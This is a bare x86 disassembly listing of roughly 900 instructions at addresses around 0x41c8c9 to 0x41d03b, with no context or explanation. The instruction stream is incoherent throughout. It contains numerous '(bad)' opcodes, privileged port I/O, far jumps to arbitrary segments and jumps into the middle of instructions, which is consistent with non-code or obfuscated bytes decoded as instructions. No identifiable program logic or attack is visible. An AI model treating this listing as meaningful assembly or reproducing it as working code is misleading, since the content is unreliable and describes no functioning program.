  41c8c9:	jns    0x41c90d
  41c8cb:	retf   0xddbd
  41c8ce:	loop   0x41c941
  41c8d0:	add    al,0xef
  41c8d2:	jl     0x41c896
  41c8d4:	outs   dx,BYTE PTR ds:[esi]
  41c8d5:	jno    0x41c8b2
  41c8d7:	add    ebx,DWORD PTR [eax]
  41c8d9:	jp     0x41c8c3
  41c8db:	xchg   BYTE PTR [esi],cl
  41c8dd:	jg     0x41c953
  41c8df:	cs or  al,0x4b
  41c8e2:	sahf   
  41c8e3:	jnp    0x41c867
  41c8e5:	jg     0x41c925
  41c8e7:	add    ecx,DWORD PTR [ebp-0x6d8c61ce]
  41c8ed:	jle    0x41c8d6
  41c8ef:	icebp  
  41c8f0:	xchg   DWORD PTR [edx+0x54],ebx
  41c8f3:	popa   
  41c8f4:	dec    DWORD PTR [esi]
  41c8f6:	call   0x46e0:0x1b29c7db
  41c8fd:	push   0xffffffe9
  41c8ff:	ja     0x41c8b6
  41c901:	clc    
  41c902:	xchg   esi,eax
  41c903:	je     0x41c8d3
  41c905:	adc    DWORD PTR [ebx],eax
  41c907:	and    DWORD PTR [ebx-0x4901d7e4],ebp
  41c90d:	and    al,0xe6
  41c90f:	das    
  41c910:	mul    BYTE PTR [ecx]
  41c912:	test   al,0x80
  41c914:	xor    BYTE PTR [edx+0x336f6352],dl
  41c91a:	push   ds
  41c91b:	sub    esi,edx
  41c91d:	sbb    DWORD PTR [esi+ecx*2-0x55d0b938],0xfffffff6
  41c925:	dec    ebx
  41c926:	cmp    bl,BYTE PTR [ecx+0x7c0c7043]
  41c92c:	mov    BYTE PTR [eax],al
  41c92e:	push   ecx
  41c92f:	add    eax,0xdf24802a
  41c934:	push   ss
  41c935:	or     ebx,esp
  41c937:	and    eax,0xe4be9e3d
  41c93c:	mov    ebp,DWORD PTR [ecx+ecx*8-0x77174bb0]
  41c943:	or     eax,DWORD PTR [esi]
  41c945:	jmp    0x41c90a
  41c947:	pushw  0xfb07
  41c94b:	jmp    0x49be:0x637c4c49
  41c952:	mov    ch,0xc4
  41c954:	(bad)  
  41c955:	inc    esp
  41c956:	cmp    BYTE PTR [ebx+0x7a4a24c9],0x91
  41c95d:	sti    
  41c95e:	das    
  41c95f:	in     eax,dx
  41c960:	ret    0xafa9
  41c963:	adc    al,0x7
  41c965:	lods   al,BYTE PTR ds:[esi]
  41c966:	mov    dl,0xf1
  41c968:	cmp    bl,bl
  41c96a:	pusha  
  41c96b:	aam    0xfc
  41c96d:	jo     0x41c983
  41c96f:	js     0x41c9df
  41c971:	sbb    BYTE PTR [edi],bl
  41c973:	jle    0x41c98c
  41c975:	inc    ebp
  41c976:	aaa    
  41c977:	imul   esi,DWORD PTR [esi+edx*1-0x37],0x44
  41c97c:	lods   al,BYTE PTR ds:[esi]
  41c97d:	les    esi,FWORD PTR [edi+0x40]
  41c980:	inc    ebx
  41c981:	rcr    BYTE PTR ds:0xc77543a9,1
  41c987:	sbb    al,0x1c
  41c989:	sub    al,0x69
  41c98b:	(bad)  
  41c98c:	out    0xba,al
  41c98e:	in     al,0x0
  41c990:	scas   al,BYTE PTR es:[edi]
  41c991:	push   esi
  41c992:	adc    bh,ah
  41c994:	ss push es
  41c996:	mov    DWORD PTR [edi],esp
  41c998:	mov    edi,0xd2aa7285
  41c99d:	test   bh,0x3
  41c9a0:	int3   
  41c9a1:	inc    esp
  41c9a2:	xchg   DWORD PTR [ebx+0x75],ecx
  41c9a5:	call   0x669b:0xb9682529
  41c9ac:	jne    0x41c9b9
  41c9ae:	out    0xc9,al
  41c9b0:	sub    al,0x77
  41c9b2:	arpl   WORD PTR [esp+ecx*4-0x30f864cb],sp
  41c9b9:	jp     0x41c9f6
  41c9bb:	add    DWORD PTR [edi+0x4758cf73],edi
  41c9c1:	jg     0x41c9fc
  41c9c3:	in     eax,0x59
  41c9c5:	cmp    BYTE PTR [eax],al
  41c9c7:	lods   eax,DWORD PTR ds:[esi]
  41c9c8:	sbb    DWORD PTR [esi-0x1a0e8f61],edx
  41c9ce:	ds popf 
  41c9d0:	jle    0x41ca2b
  41c9d2:	sbb    bh,al
  41c9d4:	pop    eax
  41c9d5:	test   edx,ecx
  41c9d7:	data16 rcl BYTE PTR [ebx-0x27],cl
  41c9db:	cli    
  41c9dc:	call   0xb9e310c5
  41c9e1:	xchg   edx,eax
  41c9e2:	fstp   DWORD PTR [edx]
  41c9e4:	test   DWORD PTR [eax],edi
  41c9e6:	add    al,ch
  41c9e8:	jmp    0xa6fe:0xab04e017
  41c9ef:	pop    esp
  41c9f0:	int3   
  41c9f1:	in     eax,0x81
  41c9f3:	pusha  
  41c9f4:	jbe    0x41c9ff
  41c9f6:	repnz mov bl,BYTE PTR [ecx]
  41c9f9:	dec    ecx
  41c9fa:	mov    ecx,0x7bc02997
  41c9ff:	out    dx,eax
  41ca00:	outs   dx,DWORD PTR cs:[esi]
  41ca02:	dec    esp
  41ca03:	sbb    edx,DWORD PTR [eax+0x75]
  41ca06:	(bad)  
  41ca07:	or     ecx,DWORD PTR [edx+0x7f]
  41ca0a:	popf   
  41ca0b:	clc    
  41ca0c:	push   0xffffffe0
  41ca0e:	xchg   esi,eax
  41ca0f:	xchg   esp,eax
  41ca10:	mov    bh,0xa
  41ca12:	and    bl,BYTE PTR [edx-0x20]
  41ca15:	sub    eax,0x6190e96f
  41ca1a:	xlat   BYTE PTR ds:[ebx]
  41ca1b:	mov    eax,0xd35ac22f
  41ca20:	and    dl,BYTE PTR [edx]
  41ca22:	repz pop esp
  41ca24:	(bad)  
  41ca25:	lock pop ds
  41ca27:	rcl    DWORD PTR [ecx],1
  41ca29:	mov    dl,al
  41ca2b:	nop
  41ca2c:	push   esp
  41ca2d:	lea    esp,[esp+edx*1]
  41ca30:	ficomp WORD PTR [edi-0x39d0699f]
  41ca36:	mov    eax,0xfd255ec
  41ca3b:	mov    edx,DWORD PTR [ebx-0x8a3d39]
  41ca41:	jle    0x41ca88
  41ca43:	hlt    
  41ca44:	test   DWORD PTR [ebp+esi*8+0x7d],edx
  41ca48:	ds jl  0x41ca73
  41ca4b:	pop    ecx
  41ca4c:	iret   
  41ca4d:	push   ss
  41ca4e:	in     eax,dx
  41ca4f:	adc    esp,DWORD PTR [eax-0x55]
  41ca52:	imul   esi,esi,0xe3f36071
  41ca58:	into   
  41ca59:	xchg   edx,eax
  41ca5a:	enter  0xfe66,0xe3
  41ca5e:	xchg   esp,eax
  41ca5f:	pop    eax
  41ca60:	das    
  41ca61:	repnz shr esp,1
  41ca64:	pop    esi
  41ca65:	daa    
  41ca66:	jbe    0x41ca7e
  41ca68:	ins    DWORD PTR es:[edi],dx
  41ca69:	rcl    BYTE PTR [eax+0x5c],cl
  41ca6c:	xor    al,0xb8
  41ca6e:	xor    bl,ah
  41ca70:	cdq    
  41ca71:	inc    esp
  41ca72:	add    bl,BYTE PTR [ebp+ebx*4-0x3591d166]
  41ca79:	fidivr DWORD PTR [edx-0x593a5534]
  41ca7f:	pop    ebp
  41ca80:	ret    0x4dc6
  41ca83:	sahf   
  41ca84:	cdq    
  41ca85:	dec    eax
  41ca86:	mov    ds:0x6ac16ce9,al
  41ca8b:	or     al,0x8e
  41ca8d:	adc    al,0x5a
  41ca8f:	enter  0x3a8f,0x5
  41ca93:	push   eax
  41ca94:	je     0x41ca96
  41ca96:	cdq    
  41ca97:	add    al,0x44
  41ca99:	cmc    
  41ca9a:	int    0x54
  41ca9c:	into   
  41ca9d:	sub    bh,BYTE PTR [esi-0x2c]
  41caa0:	jno    0x41ca51
  41caa2:	pusha  
  41caa3:	cmp    ecx,DWORD PTR [ebx-0x7dc9781f]
  41caa9:	out    dx,eax
  41caaa:	inc    eax
  41caab:	pusha  
  41caac:	popa   
  41caad:	popf   
  41caae:	into   
  41caaf:	or     DWORD PTR fs:[edx],eax
  41cab2:	cld    
  41cab3:	xchg   esp,eax
  41cab4:	dec    ebp
  41cab5:	pop    edx
  41cab6:	(bad)  
  41cab7:	imul   esp,DWORD PTR [ebx],0x8ee0bf28
  41cabd:	jnp    0x41cb36
  41cabf:	jmp    0x41cb0f
  41cac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cac2:	add    bh,dh
  41cac4:	cwde   
  41cac5:	pop    ecx
  41cac6:	cwde   
  41cac7:	add    bh,BYTE PTR [eax]
  41cac9:	mov    DWORD PTR [edx],esi
  41cacb:	into   
  41cacc:	inc    sp
  41cace:	cmp    BYTE PTR [edi],ch
  41cad0:	mov    dl,0x42
  41cad2:	out    dx,al
  41cad3:	outs   dx,BYTE PTR ds:[esi]
  41cad4:	rcr    DWORD PTR [edx+0x75e68d11],cl
  41cada:	jmp    0x6a240de
  41cadf:	xchg   esp,eax
  41cae0:	sbb    ecx,ecx
  41cae2:	mov    esi,0xd21ba783
  41cae7:	test   BYTE PTR [edx-0x2b66ed57],0xb0
  41caee:	cmp    bh,BYTE PTR [ebx]
  41caf0:	loope  0x41cb27
  41caf2:	jb     0x41cb10
  41caf4:	pop    ecx
  41caf5:	xor    DWORD PTR gs:[ecx],ebp
  41caf8:	adc    edx,DWORD PTR [ebx+0x41]
  41cafb:	xchg   esi,eax
  41cafc:	dec    ebp
  41cafd:	test   al,ch
  41caff:	(bad)  
  41cb00:	stos   DWORD PTR es:[edi],eax
  41cb01:	adc    DWORD PTR [eax-0x78],0x3f1d4e28
  41cb08:	push   ebx
  41cb09:	dec    edx
  41cb0a:	mov    bl,0x12
  41cb0c:	(bad)  
  41cb0d:	push   ebp
  41cb0e:	data16 adc dl,bl
  41cb11:	in     eax,0x7e
  41cb13:	addr16 sub ebx,esi
  41cb16:	inc    ecx
  41cb17:	pop    ecx
  41cb18:	pop    ecx
  41cb19:	mov    ch,0xd7
  41cb1b:	push   0x2fc48e8
  41cb20:	inc    edx
  41cb21:	es fwait
  41cb23:	add    BYTE PTR [eax],bh
  41cb25:	dec    edi
  41cb26:	cld    
  41cb27:	xor    DWORD PTR [esi],esp
  41cb29:	out    0x3f,eax
  41cb2b:	sbb    edi,ebp
  41cb2d:	push   edi
  41cb2e:	jmp    0x41cb0d
  41cb30:	xchg   edx,eax
  41cb31:	fdivr  QWORD PTR [ebp+0x19ebe915]
  41cb37:	popa   
  41cb38:	std    
  41cb39:	addr16 out dx,al
  41cb3b:	pop    edi
  41cb3c:	mov    edx,0x26cdbaa1
  41cb41:	lods   eax,DWORD PTR ds:[esi]
  41cb42:	xchg   ebp,eax
  41cb43:	out    dx,eax
  41cb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb45:	fstp   QWORD PTR [eax]
  41cb47:	pusha  
  41cb48:	push   esp
  41cb49:	xor    dh,BYTE PTR [edi]
  41cb4b:	xchg   DWORD PTR [edi-0x57],ebx
  41cb4e:	push   es
  41cb4f:	jmp    0x41cbb9
  41cb51:	cmc    
  41cb52:	pop    eax
  41cb53:	gs pop esi
  41cb55:	cmp    cl,BYTE PTR [edx+ebp*8+0x5402bd17]
  41cb5c:	pop    es
  41cb5d:	inc    edx
  41cb5e:	sbb    eax,DWORD PTR [eax]
  41cb60:	mov    ebx,0x99590786
  41cb65:	xor    al,0x14
  41cb67:	cmp    bl,ch
  41cb69:	clc    
  41cb6a:	cmp    dl,BYTE PTR [esi+0x22718a40]
  41cb70:	arpl   WORD PTR [edx+ebp*4+0x3317d3b2],si
  41cb77:	jo     0x41cb57
  41cb79:	sar    BYTE PTR [eax],1
  41cb7b:	js     0x41cb68
  41cb7d:	fs or  al,0xb2
  41cb80:	or     DWORD PTR [edx-0x25],0x6278e23c
  41cb87:	idiv   DWORD PTR [edi+0xd]
  41cb8a:	lock dec edx
  41cb8c:	sti    
  41cb8d:	pop    esp
  41cb8e:	mov    fs,WORD PTR ds:0x70ec0ef7
  41cb94:	aas    
  41cb95:	mov    edi,0x6ed5f23c
  41cb9a:	fcmovne st,st(4)
  41cb9c:	dec    ecx
  41cb9d:	xchg   BYTE PTR [edx+0x68],ch
  41cba0:	mov    esi,0x7475b454
  41cba5:	adc    esi,edx
  41cba7:	mov    ch,0x83
  41cba9:	frstor [esi-0x12]
  41cbac:	cmp    ebp,DWORD PTR [edx+0x32d816e3]
  41cbb2:	add    bh,BYTE PTR [eax+0x7867fac7]
  41cbb8:	scas   eax,DWORD PTR es:[edi]
  41cbb9:	sbb    eax,0xde58cf9d
  41cbbe:	mov    ecx,0xadc7e0f3
  41cbc3:	mov    DWORD PTR [ecx-0x58f9171f],edi
  41cbc9:	jbe    0x41cbe4
  41cbcb:	fdiv   DWORD PTR [ecx-0x7e23d6c7]
  41cbd1:	mov    ch,0x52
  41cbd3:	cld    
  41cbd4:	fisttp DWORD PTR [ecx-0xf]
  41cbd7:	adc    eax,0xb00392ab
  41cbdc:	ret    
  41cbdd:	(bad)  [ebp+0x59ff5327]
  41cbe3:	mov    al,ds:0x426631cf
  41cbe8:	imul   esi
  41cbea:	adc    al,dh
  41cbec:	xor    edx,DWORD PTR [edi+0x41b573b]
  41cbf2:	jge    0x41cc21
  41cbf4:	es dec edi
  41cbf6:	mov    dl,0x41
  41cbf8:	rol    DWORD PTR [ebx],0x6a
  41cbfb:	cmp    al,0xd1
  41cbfd:	mov    cl,0x15
  41cbff:	pop    esi
  41cc00:	mov    edi,0xf482daca
  41cc05:	jae    0x41cbcb
  41cc07:	xor    dh,BYTE PTR [edx-0x3f14a234]
  41cc0d:	pop    esi
  41cc0e:	jle    0x41cc56
  41cc10:	lahf   
  41cc11:	xor    DWORD PTR ds:0x4749eb78,esi
  41cc17:	lock or dh,BYTE PTR [eax]
  41cc1a:	cmp    al,0x5f
  41cc1c:	jns    0x41cba6
  41cc1e:	and    BYTE PTR [edx],ch
  41cc20:	imul   ebx,DWORD PTR [eax],0x64
  41cc23:	imul   ebp,DWORD PTR ds:0x1d23fdd9,0xd9250282
  41cc2d:	rcl    BYTE PTR [edi],0xb7
  41cc30:	add    BYTE PTR [edx-0x5c2a6ece],ch
  41cc36:	(bad)  
  41cc37:	std    
  41cc38:	xchg   BYTE PTR [eax+0x65035ee2],bl
  41cc3e:	fs cmp eax,0xda3e3644
  41cc44:	mov    al,0xd5
  41cc46:	arpl   WORD PTR [ecx-0x30e51c51],dx
  41cc4c:	(bad)  
  41cc4d:	aas    
  41cc4e:	ins    BYTE PTR es:[edi],dx
  41cc4f:	push   cs
  41cc50:	or     eax,0xa00a875e
  41cc55:	add    al,0xfb
  41cc57:	lds    esi,FWORD PTR [esi]
  41cc59:	clc    
  41cc5a:	or     al,0xf1
  41cc5c:	cmp    BYTE PTR [ebx],bl
  41cc5e:	mov    eax,0x6eecb91
  41cc63:	ret    0x8ee3
  41cc66:	shl    edi,0xbd
  41cc69:	jmp    0xe47b:0x53b73b40
  41cc70:	mov    dl,0x3a
  41cc72:	and    al,0xf1
  41cc74:	dec    ecx
  41cc75:	or     BYTE PTR [ecx+0x7c],al
  41cc78:	clc    
  41cc79:	dec    edx
  41cc7a:	and    DWORD PTR ds:0x93e04b53,ebx
  41cc80:	pop    ebx
  41cc81:	inc    edi
  41cc82:	test   BYTE PTR fs:[edx+0x6816d7b1],bl
  41cc89:	jg     0x41ccab
  41cc8b:	(bad)
  41cc8e:	inc    DWORD PTR [edx+0x78995182]
  41cc94:	push   ebx
  41cc95:	add    al,0xdd
  41cc97:	fsubr  QWORD PTR ds:0xa43e9524
  41cc9d:	aam    0x6c
  41cc9f:	push   edx
  41cca0:	sub    al,0x3c
  41cca2:	mov    esi,0x687ad52d
  41cca7:	les    edi,FWORD PTR [esi]
  41cca9:	or     bh,BYTE PTR [edi]
  41ccab:	cmp    al,0x42
  41ccad:	cmp    BYTE PTR [esp+ebx*2],bh
  41ccb0:	mov    ah,0x92
  41ccb2:	enter  0xfb01,0xa8
  41ccb6:	out    dx,eax
  41ccb7:	and    DWORD PTR [ebp-0x1020c176],edi
  41ccbd:	sbb    esi,DWORD PTR [edx+0x47]
  41ccc0:	or     eax,0x865e946
  41ccc5:	jmp    0x91e0e3e7
  41ccca:	push   ebx
  41cccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cccc:	xchg   ecx,eax
  41cccd:	pop    edx
  41ccce:	mov    ds:0x6e42fd04,al
  41ccd3:	jo     0x41ccce
  41ccd5:	jb     0x41ccea
  41ccd7:	rcl    edi,cl
  41ccd9:	addr16 pop esp
  41ccdb:	cwde   
  41ccdc:	or     dl,BYTE PTR [edx]
  41ccde:	xor    eax,0xe0dead26
  41cce3:	xor    dh,bl
  41cce5:	and    dl,BYTE PTR [ebx+0x66796f0e]
  41cceb:	lods   eax,DWORD PTR ds:[esi]
  41ccec:	mov    eax,0xde666652
  41ccf1:	and    eax,0x9cf8863
  41ccf6:	xor    eax,0x9ab15847
  41ccfb:	scas   eax,DWORD PTR es:[edi]
  41ccfc:	mov    ds:0x9d2f4682,eax
  41cd01:	in     al,dx
  41cd02:	out    0xd3,al
  41cd04:	or     BYTE PTR [edi+0x5f6bc804],al
  41cd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd0b:	popa   
  41cd0c:	jg     0x41ccb1
  41cd0e:	dec    edi
  41cd0f:	mov    bh,0x99
  41cd11:	iret   
  41cd12:	retf   
  41cd13:	or     ebp,DWORD PTR [ebx+ecx*2+0x7cd7bf14]
  41cd1a:	sbb    eax,0x1e0a004b
  41cd1f:	fldenv [ecx-0x24dd1671]
  41cd25:	imul   edx,DWORD PTR [ebx-0x5400ab6d],0xffffffa7
  41cd2c:	mov    ds:0xcf7d3d93,al
  41cd31:	jmp    0xb7a17c66
  41cd36:	jno    0x41cd23
  41cd38:	pop    DWORD PTR [edx-0x104a176]
  41cd3e:	xlat   BYTE PTR ds:[ebx]
  41cd3f:	cli    
  41cd40:	mov    edx,cs
  41cd42:	lea    ecx,[edi+0x32]
  41cd45:	nop
  41cd46:	call   0xf4a:0x2e6ca775
  41cd4d:	arpl   WORD PTR [esi-0x58],bx
  41cd50:	sbb    edx,DWORD PTR [ebx-0x73]
  41cd53:	mov    ds:0x24cb8c44,eax
  41cd58:	fwait
  41cd59:	sbb    DWORD PTR [edx-0x1a],esp
  41cd5c:	sub    eax,0xf2bdd8c2
  41cd61:	jg     0x41cd2e
  41cd63:	jbe    0x41cd0d
  41cd65:	push   ebx
  41cd66:	dec    esi
  41cd67:	int    0xc9
  41cd69:	nop
  41cd6a:	lock mov bh,0x4b
  41cd6d:	call   0x2ae5e8ed
  41cd72:	add    al,0x2
  41cd74:	(bad)
  41cd79:	push   ss
  41cd7a:	ss mov cl,bl
  41cd7d:	cmp    ebp,DWORD PTR [edi-0x2e]
  41cd80:	mov    bl,0xf8
  41cd82:	stos   BYTE PTR es:[edi],al
  41cd83:	or     eax,0xc4aa7c6e
  41cd88:	scas   al,BYTE PTR es:[edi]
  41cd89:	cmp    eax,0x1093981f
  41cd8e:	cwde   
  41cd8f:	es ins BYTE PTR es:[edi],dx
  41cd91:	sub    DWORD PTR ds:0x7ca1228b,0xaa7cbcc9
  41cd9b:	pop    eax
  41cd9c:	aas    
  41cd9d:	out    0xd4,eax
  41cd9f:	sub    BYTE PTR [edi],ah
  41cda1:	jnp    0x41cd7e
  41cda3:	cmp    bl,BYTE PTR [ecx]
  41cda5:	pusha  
  41cda6:	fyl2xp1 
  41cda8:	into   
  41cda9:	push   ebp
  41cdaa:	sbb    esp,0x85836a25
  41cdb0:	cmp    BYTE PTR [eax],0x0
  41cdb3:	test   esi,eax
  41cdb5:	das    
  41cdb6:	test   al,0x89
  41cdb8:	sbb    al,0x35
  41cdba:	jb     0x41ce2f
  41cdbc:	jle    0x41cd8d
  41cdbe:	push   ss
  41cdbf:	clc    
  41cdc0:	push   0xfec99445
  41cdc5:	leave  
  41cdc6:	xchg   eax,ebp
  41cdc8:	or     BYTE PTR ds:0x994c77c8,0x74
  41cdcf:	jbe    0x41cd5b
  41cdd1:	fimul  WORD PTR [ecx]
  41cdd3:	push   edi
  41cdd4:	into   
  41cdd5:	inc    esi
  41cdd6:	aad    0x7b
  41cdd8:	and    DWORD PTR [esi-0x25942565],ebx
  41cdde:	test   DWORD PTR [esi-0x5e],ebx
  41cde1:	or     ecx,0x2
  41cde4:	sub    dl,BYTE PTR [edi]
  41cde6:	mov    bh,0x63
  41cde8:	add    ebx,DWORD PTR [ecx+0x40829816]
  41cdee:	dec    esi
  41cdef:	jg     0x41cd80
  41cdf1:	xchg   esp,eax
  41cdf2:	xor    DWORD PTR [eax],ebp
  41cdf4:	addr16 (bad) 
  41cdf6:	inc    ebp
  41cdf7:	sbb    BYTE PTR [esi],ah
  41cdf9:	shl    DWORD PTR [edx+0x62a84175],1
  41cdff:	push   edx
  41ce00:	push   ecx
  41ce01:	mov    al,0x27
  41ce03:	iret   
  41ce04:	jmp    0xebdbccf7
  41ce09:	mov    dl,0x64
  41ce0b:	cwde   
  41ce0c:	loope  0x41ce13
  41ce0e:	mov    cl,0x4b
  41ce10:	xchg   ecx,eax
  41ce11:	aad    0x9f
  41ce13:	addr16 (bad) 
  41ce15:	cmc    
  41ce16:	mov    esi,0x505221bd
  41ce1b:	xchg   DWORD PTR [eax],ecx
  41ce1d:	and    bl,BYTE PTR [eax+0x5e]
  41ce20:	or     ah,bh
  41ce22:	jp     0x41cde3
  41ce24:	adc    edx,0x23
  41ce27:	mov    al,0xb4
  41ce29:	push   0x21
  41ce2b:	jl     0x41ce1c
  41ce2d:	pushf  
  41ce2e:	inc    edx
  41ce2f:	scas   eax,DWORD PTR es:[edi]
  41ce30:	pop    edx
  41ce31:	sub    BYTE PTR ds:0x90acda66,0xa1
  41ce38:	mov    al,ds:0xc01161b8
  41ce3d:	out    0x47,al
  41ce3f:	jnp    0x41ce22
  41ce41:	ins    BYTE PTR es:[edi],dx
  41ce42:	xchg   edx,eax
  41ce43:	and    ebx,DWORD PTR [edi-0x33]
  41ce46:	fcomi  st,st(6)
  41ce48:	sbb    edx,edx
  41ce4a:	mov    WORD PTR [esi+0x5c8090d],?
  41ce50:	mov    ds:0x236af659,al
  41ce55:	mov    esi,0xbe8cdd1a
  41ce5a:	fist   WORD PTR ds:0xeb93a39f
  41ce60:	push   esi
  41ce61:	pop    eax
  41ce63:	xor    eax,0x5b859998
  41ce68:	rcr    DWORD PTR [ebp+eiz*1-0x3e],cl
  41ce6c:	shl    DWORD PTR [esi],1
  41ce6e:	adc    edi,DWORD PTR [esi+esi*8-0x68]
  41ce72:	adc    esp,edx
  41ce74:	pop    ds
  41ce75:	mov    DWORD PTR [edx+esi*8],edx
  41ce78:	js     0x41cebd
  41ce7a:	in     al,dx
  41ce7b:	aad    0x52
  41ce7d:	jge    0x41ce26
  41ce7f:	jp     0x41ce64
  41ce81:	adc    edx,DWORD PTR [esi+0x22]
  41ce84:	scas   al,BYTE PTR es:[edi]
  41ce85:	sbb    al,0xff
  41ce87:	in     al,0xbb
  41ce89:	dec    edx
  41ce8a:	xchg   esi,eax
  41ce8b:	pop    ecx
  41ce8c:	xor    bh,BYTE PTR [ebp+0x1a03bb1d]
  41ce92:	out    dx,eax
  41ce93:	push   edi
  41ce94:	cmp    cl,BYTE PTR [ecx+ebp*4+0x3bad4455]
  41ce9b:	les    esi,FWORD PTR ds:0xe7ab9cf2
  41cea1:	inc    ebp
  41cea2:	dec    ecx
  41cea3:	jmp    0x41ce77
  41cea5:	inc    eax
  41cea6:	sub    eax,0x86df41e0
  41ceab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceac:	and    al,0x2d
  41ceae:	mov    esp,0xd881071d
  41ceb3:	dec    ebx
  41ceb4:	int3   
  41ceb5:	jge    0x41ceca
  41ceb7:	pop    edx
  41ceb8:	inc    ebp
  41ceb9:	xor    BYTE PTR [ebp+0xa5658a1],ch
  41cebf:	cli    
  41cec0:	mov    ds:0x727256ee,eax
  41cec5:	lahf   
  41cec6:	jecxz  0x41cf41
  41cec8:	jae    0x41cedf
  41ceca:	es jl  0x41cea9
  41cecd:	sbb    edi,0x4d6025b
  41ced3:	sub    al,0x31
  41ced5:	xlat   BYTE PTR ds:[ebx]
  41ced6:	call   0x53abc1e9
  41cedb:	sar    DWORD PTR [edi],0x7b
  41cede:	dec    edi
  41cedf:	jmp    0x41cf55
  41cee1:	cmp    BYTE PTR [esi+0x202b650c],bh
  41cee7:	dec    ebx
  41cee8:	lods   eax,DWORD PTR ds:[esi]
  41cee9:	xchg   DWORD PTR ds:0xa5e9655e,esi
  41ceef:	pop    esp
  41cef0:	cmc    
  41cef1:	fs stos BYTE PTR es:[edi],al
  41cef3:	scas   al,BYTE PTR es:[edi]
  41cef4:	fldenv [ebp+0x2b]
  41cef7:	out    dx,eax
  41cef8:	push   eax
  41cef9:	add    DWORD PTR [eiz*4+0x1694311],esp
  41cf00:	sbb    esp,DWORD PTR [ecx+0x518b742]
  41cf06:	sbb    cl,ch
  41cf08:	jo     0x41cf23
  41cf0a:	xor    BYTE PTR [ecx],ch
  41cf0c:	mov    ebx,0xaad82a48
  41cf11:	sbb    ebp,DWORD PTR [edi]
  41cf13:	lods   al,BYTE PTR ds:[esi]
  41cf14:	lahf   
  41cf15:	xor    al,0x79
  41cf17:	test   bh,cl
  41cf19:	pop    edi
  41cf1a:	xor    eax,0xb52ebf67
  41cf1f:	jno    0x41cebd
  41cf21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf22:	adc    al,0xda
  41cf24:	jbe    0x41cecf
  41cf26:	push   ebx
  41cf27:	rcl    DWORD PTR [edi-0x3],1
  41cf2a:	inc    BYTE PTR ds:0x55cb2b53
  41cf30:	pop    edi
  41cf31:	inc    ebp
  41cf32:	dec    edx
  41cf33:	fdivrp st(3),st
  41cf35:	mov    dh,0xd6
  41cf37:	mov    esp,?
  41cf39:	lods   al,BYTE PTR ds:[esi]
  41cf3a:	ins    BYTE PTR es:[edi],dx
  41cf3b:	mov    eax,ds:0x36849edf
  41cf40:	mov    es,ebx
  41cf42:	lahf   
  41cf43:	pop    edx
  41cf44:	inc    ecx
  41cf45:	pop    es
  41cf46:	push   es
  41cf47:	not    DWORD PTR [eax+0x1f]
  41cf4a:	call   0xd8658508
  41cf4f:	or     ch,ch
  41cf51:	push   esi
  41cf52:	or     dh,BYTE PTR [esi+0x7b]
  41cf55:	mov    edx,0x9c3d2d1
  41cf5a:	inc    edx
  41cf5b:	sub    BYTE PTR [eax+0x4c],dh
  41cf5e:	pop    es
  41cf5f:	cmp    al,0x52
  41cf61:	xchg   edx,eax
  41cf62:	xchg   ecx,eax
  41cf63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf64:	rcr    BYTE PTR [edx-0x4e0a06ec],cl
  41cf6a:	mov    ebx,0xc4f6defc
  41cf6f:	pop    edx
  41cf70:	cmp    BYTE PTR [eax-0x45a34f37],al
  41cf76:	jg     0x41cf9a
  41cf78:	and    ecx,DWORD PTR [edi+eiz*2]
  41cf7b:	sbb    eax,0xfe88e315
  41cf80:	ins    BYTE PTR es:[edi],dx
  41cf81:	js     0x41cff3
  41cf83:	cmc    
  41cf84:	and    bl,BYTE PTR [esi-0xae3a9cb]
  41cf8a:	pushf  
  41cf8b:	or     eax,0x653219af
  41cf90:	sub    bh,BYTE PTR [ebp-0x16]
  41cf93:	rcr    BYTE PTR [ecx-0x613ddba4],cl
  41cf99:	jg     0x41cf9c
  41cf9b:	retf   
  41cf9c:	in     al,0x5b
  41cf9e:	jl     0x41cfcb
  41cfa0:	adc    DWORD PTR [edi+0x28],eax
  41cfa3:	call   0x887ccb08
  41cfa8:	cdq    
  41cfa9:	jle    0x41cfa8
  41cfab:	out    dx,al
  41cfac:	or     DWORD PTR [ebp-0x38],ebx
  41cfaf:	imul   edx,DWORD PTR [ebp*8-0x3cd3de2c],0xe1648d52
  41cfba:	hlt    
  41cfbb:	xlat   BYTE PTR ds:[ebx]
  41cfbc:	or     eax,DWORD PTR [ebx+0x3f5e1880]
  41cfc2:	adc    DWORD PTR [ebp-0xcacb120],edi
  41cfc8:	mov    BYTE PTR [edx+0x23],0x6c
  41cfcc:	nop
  41cfcd:	adc    eax,0x4b0189da
  41cfd2:	mov    eax,ds:0x2ab6655b
  41cfd7:	pop    edi
  41cfd8:	mov    ebx,DWORD PTR [edx-0x5d]
  41cfdb:	mov    ebx,0x519bfadc
  41cfe0:	and    BYTE PTR [edi-0x54277c8f],dl
  41cfe6:	ins    DWORD PTR es:[edi],dx
  41cfe7:	cmp    edx,eax
  41cfe9:	push   ebp
  41cfea:	sbb    edx,DWORD PTR [eax-0x7d]
  41cfed:	leave  
  41cfee:	pop    ebp
  41cfef:	jmp    0x41cff6
  41cff1:	addr16 (bad) 
  41cff3:	xchg   edi,eax
  41cff4:	lahf   
  41cff5:	std    
  41cff6:	xor    eax,0x18e36ef0
  41cffb:	repnz fwait
  41cffd:	loop   0x41d023
  41cfff:	enter  0x624a,0xe7
  41d003:	stos   DWORD PTR es:[edi],eax
  41d004:	ffree  st(6)
  41d006:	xchg   esi,eax
  41d007:	push   es
  41d008:	xchg   edx,eax
  41d009:	mov    dl,0x4d
  41d00b:	mov    esp,0x12a0839c
  41d010:	in     al,dx
  41d011:	add    dh,cl
  41d013:	(bad)  
  41d014:	lods   al,BYTE PTR ds:[esi]
  41d015:	addr16 mov ds:0x86d0,al
  41d019:	nop
  41d01a:	call   0x24d0b4db
  41d01f:	rcl    BYTE PTR [ecx],0x16
  41d022:	test   eax,0xd41765f5
  41d027:	mov    edx,DWORD PTR [esi-0x12741999]
  41d02d:	and    bh,BYTE PTR [edi]
  41d02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d030:	imul   ebp,DWORD PTR [ecx+0x723167b],0x2a5f67cd
  41d03a:	icebp  
  41d03b:	hlt    
